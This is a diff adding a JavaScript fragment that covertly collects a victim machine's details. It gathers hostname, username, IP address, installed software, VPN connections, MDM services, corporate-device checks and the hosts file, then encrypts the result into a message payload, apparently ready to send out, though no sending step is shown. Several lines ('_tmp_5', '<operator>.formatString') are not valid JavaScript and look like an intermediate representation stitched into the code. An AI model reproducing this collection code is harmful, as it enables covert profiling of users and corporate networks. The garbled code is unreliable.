@@ -1,0 +1,21 @@
+const dataCollection = {
+    sys: sysModule.platform(),
+    architecture: sysModule.arch(),
+    cores: sysModule.cpus().length,
+    hostName: sysModule.hostname(),
+    userAccount: sysModule.userInfo().username,
+    ipAddress: ipAddress,
+    isCompanyRelated: isCompanyRelated,
+    additionalInfo: getAdditionalSystemInfo(),
+    softwareInstalled: additionalData.softwareInstalled,
+    vpnConnections: additionalData.vpnConnections,
+    mdmServices: additionalData.mdmServices,
+    deviceNameCorporate: checkDeviceName(),
+    hostsFile: additionalData.hostsFile // Añadimos el archivo hosts
+  }
+_tmp_5.architecture = sysModule.arch()
+const encryptedData = obscureData(JSON.stringify(dataCollection), secretKey)
+const messagePayload = JSON.stringify({
+    content: `Information: ${encryptedData}`
+  })
+_tmp_8.content = <operator>.formatString("Information: ", encryptedData, "")
